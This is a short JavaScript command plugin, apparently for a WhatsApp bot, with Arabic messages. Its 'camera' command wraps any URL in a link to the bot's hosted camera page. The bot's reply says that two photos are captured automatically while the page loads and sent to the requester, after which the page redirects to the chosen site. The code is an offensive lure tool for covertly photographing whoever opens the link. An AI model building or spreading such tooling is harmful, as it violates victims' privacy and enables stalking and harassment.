const path = require('path');

module.exports = async ({ text, reply, sock, from, msg, sessionId }) => {
  if (!text.toLowerCase().startsWith('camera')) return;

  const parts = text.split(' ');
  if (parts.length < 2) {
    return reply('❌ أرسل الرابط بعد الأمر.\nمثال: camera https://example.com');
  }

  const targetUrl = parts[1];

  // إذا لم يتم تعيين BASE_URL، نستخدم الرابط الفعلي من Render عبر req.headers
  const baseUrl = process.env.BASE_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost:3000'}`;

  const pageUrl = `${baseUrl}/camera.html?redirect=${encodeURIComponent(targetUrl)}&chat=${encodeURIComponent(from)}&sessionId=${encodeURIComponent(sessionId)}`;

  await sock.sendMessage(from, {
    text: `📸 افتح الرابط للسماح بالكاميرا:\n${pageUrl}\n\n> سيتم التقاط صورتين تلقائيًا أثناء التحميل وإرسالها إليك.`
  }, { quoted: msg });
};
